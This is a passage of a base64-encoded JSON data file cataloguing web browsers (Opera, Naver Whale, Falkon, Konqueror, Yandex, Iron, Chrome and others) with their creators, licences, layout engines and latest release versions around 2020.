CJ0eXBlXCI6IFwiV2ViIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidWlcIjogXCJHcmFwaGljYWxNb2RlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNyZWF0b3JcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiT3BlcmEgU29mdHdhcmVcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9PcGVyYV9Tb2Z0d2FyZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkZyZWVcIixcclxuICAgICAgICAgICAgICAgIFwic3RhdHVzXCI6IFwiQWN0aXZlXCIsXHJcbiAgICAgICAgICAgICAgICBcImxpY2VuY2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiUHJvcHJpZXRhcnlcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9Qcm9wcmlldGFyeV9zb2Z0d2FyZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF5b3V0XCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkJsaW5rXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvQmxpbmtfKHdlYl9lbmdpbmUpXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXRlc3QtcmVsZWFzZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJBbmRyb2lkXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiNTkuMS4yOTI2LjU0MDY3XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIkp1bHkgMTMsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJBbmRyb2lkIChjbGFzc2ljKVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjEyLjEuOVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJKdW5lIDgsIDIwMTZcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJTeW1iaWFuXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiUzYwIDEyLjAuMjJcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiSnVuZSAyNCwgMjAxMlwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcIldpbmRvd3MgTW9iaWxlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMTAuMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJNYXJjaCAxNiwgMjAxMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIndoYWxlXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIk5hdmVyIFdoYWxlXCIsXHJcbiAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJXZWIgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ1aVwiOiBcIkdyYXBoaWNhbE1vZGVcIixcclxuICAgICAgICAgICAgICAgIFwiY3JlYXRvclwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJOYXZlciBDb3Jwb3JhdGlvblwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL05hdmVyX0NvcnBvcmF0aW9uXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJjb3N0XCI6IFwiRnJlZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJBY3RpdmVcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJGcmVld2FyZVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0ZyZWV3YXJlXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXlvdXRcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQmxpbmtcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9CbGlua18od2ViX2VuZ2luZSlcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxhdGVzdC1yZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIkFuZHJvaWRcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCIxLjUuNC4yXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIk1heSAyNiwgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcImlPU1wiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjEuNS4wXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIk1heSAyNSwgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcIm1hY09TXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMi43LjEwMC4yMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJKdW5lIDE4LCAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIFwiV2luZG93c1wiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjIuNy4xMDAuMjBcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiSnVuZSAxOCwgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcIkxpbnV4XCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMi43LjEwMC4yMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJKdW5lIDE4LCAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiRmFsa29uXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkZhbGtvblwiLFxyXG4gICAgICAgICAgICAgICAgXCJ0eXBlXCI6IFwiV2ViIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidWlcIjogXCJHcmFwaGljYWxNb2RlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNyZWF0b3JcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiRGF2aWQgUm9zY2FcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9MaW5rc18od2ViX2Jyb3dzZXIpXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJjb3N0XCI6IFwiRnJlZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJBY3RpdmVcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJHUEwgMy4wXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvR05VX0dlbmVyYWxfUHVibGljX0xpY2Vuc2VcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJCbGlua1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0JsaW5rXyh3ZWJfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMy4xLjAuNzVcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiTWFyY2ggMTksIDIwMTlcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJLb25xdWVyb3JcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiS29ucXVlcm9yIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiR3JhcGhpY2FsTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIktERVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0tERVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkZyZWVcIixcclxuICAgICAgICAgICAgICAgIFwic3RhdHVzXCI6IFwiQWN0aXZlXCIsXHJcbiAgICAgICAgICAgICAgICBcImxpY2VuY2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiR1BMXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvR05VX0dlbmVyYWxfUHVibGljX0xpY2Vuc2VcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJLSFRNTFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0tIVE1MXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiV2ViS2l0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvV2ViS2l0XCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXRlc3QtcmVsZWFzZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJTdGFibGUgcmVsZWFzZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjIwLjA4LjJcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiNyBKdW5lIDIwMThcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJQcmV2aWV3IHJlbGVhc2VcIjogW11cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJZYUJyb3dzZXJcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiWWFuZGV4IEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiR3JhcGhpY2FsTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIllhbmRleFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL1lhbmRleFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkZyZWVcIixcclxuICAgICAgICAgICAgICAgIFwic3RhdHVzXCI6IFwiQWN0aXZlXCIsXHJcbiAgICAgICAgICAgICAgICBcImxpY2VuY2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiUHJvcHJpZXRhcnlcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9Qcm9wcmlldGFyeV9zb2Z0d2FyZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF5b3V0XCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkJsaW5rXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvQmxpbmtfKHdlYl9lbmdpbmUpXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXRlc3QtcmVsZWFzZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJBbmRyb2lkXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMjAuNi4zLjU0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIkp1bHkgMjMsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJpT1NcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCIyMC42LjIuMzE4XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIkp1bHkgMTYsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJtYWNPU1wiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjIwLjcuMlwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJKdWx5IDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJXaW5kb3dzXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMjAuNy4yXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIkp1bHkgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcIkxpbnV4XCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMjAuNy4yXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIkp1bHkgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIlF0V2ViRW5naW5lXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlF0IFdlYiBFbmdpbmUgYmFzZWQgYnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ0eXBlXCI6IFwiV2ViIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidWlcIjogXCJHcmFwaGljYWxNb2RlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNyZWF0b3JcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiRG9vYmxlIFByb2plY3QgVGVhbVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0Rvb2JsZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkZyZWVcIixcclxuICAgICAgICAgICAgICAgIFwic3RhdHVzXCI6IFwiQWN0aXZlXCIsXHJcbiAgICAgICAgICAgICAgICBcImxpY2VuY2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQlNEXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvQlNEX2xpY2Vuc2VzXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXlvdXRcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQmxpbmtcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9CbGlua18od2ViX2VuZ2luZSlcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxhdGVzdC1yZWxlYXNlXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjIwMjAuMTAuMTBcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiT2N0b2JlciAxMCwgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIklyb25cIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiU1JXYXJlIElyb25cIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiR3JhcGhpY2FsTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlNSV2FyZVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJ3d3cuc3J3YXJlLm5ldFxcL2VuXFwvc29mdHdhcmVfc3J3YXJlX2lyb24ucGhwXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJjb3N0XCI6IFwiRnJlZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJBY3RpdmVcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJCU0RcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9CU0RfbGljZW5zZXNcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJCbGlua1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0JsaW5rXyh3ZWJfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlY4XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvVjhfKEphdmFTY3JpcHRfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwiQW5kcm9pZFwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjc0LjAuMzg1MC4wXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIk1heSAxMCwgMjAxOVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcIm1hY09TXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiODQuMC40MzAwLjBcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiQXVndXN0IDI5LCAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIFwiV2luZG93c1wiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjg1LjAuNDM1MC4wXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIk9jdG9iZXIgMiwgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcIkxpbnV4XCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiODUuMC40MzUwLjBcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiT2N0b2JlciA2LCAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiQ2hyb21lXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkdvb2dsZSBDaHJvbWVcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiR3JhcGhpY2FsTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkdvb2dsZSBMTENcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9Hb29nbGVcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImNvc3RcIjogXCJGcmVlXCIsXHJcbiAgICAgICAgICAgICAgICBcInN0YXR1c1wiOiBcIkFjdGl2ZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJsaWNlbmNlXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkJTRCAoQ2hyb21pdW0gZXhlY3V0YWJsZSkgKHNvbWUgY2xvc2VkLXNvdXJjZSBmZWF0dXJlcylcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9CU0RfbGljZW5zZXNcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJCbGlua1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0JsaW5rXyh3ZWJfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwiQW5kcm9pZFwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjg2LjAuNDI0MC4xMTRcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiT2N0b2JlciAyMiwgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcImlPU1wiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjg2LjAuNDI0MC45M1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJPY3RvYmVyIDEyLCAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIFwibWFjT1NcIjoge1x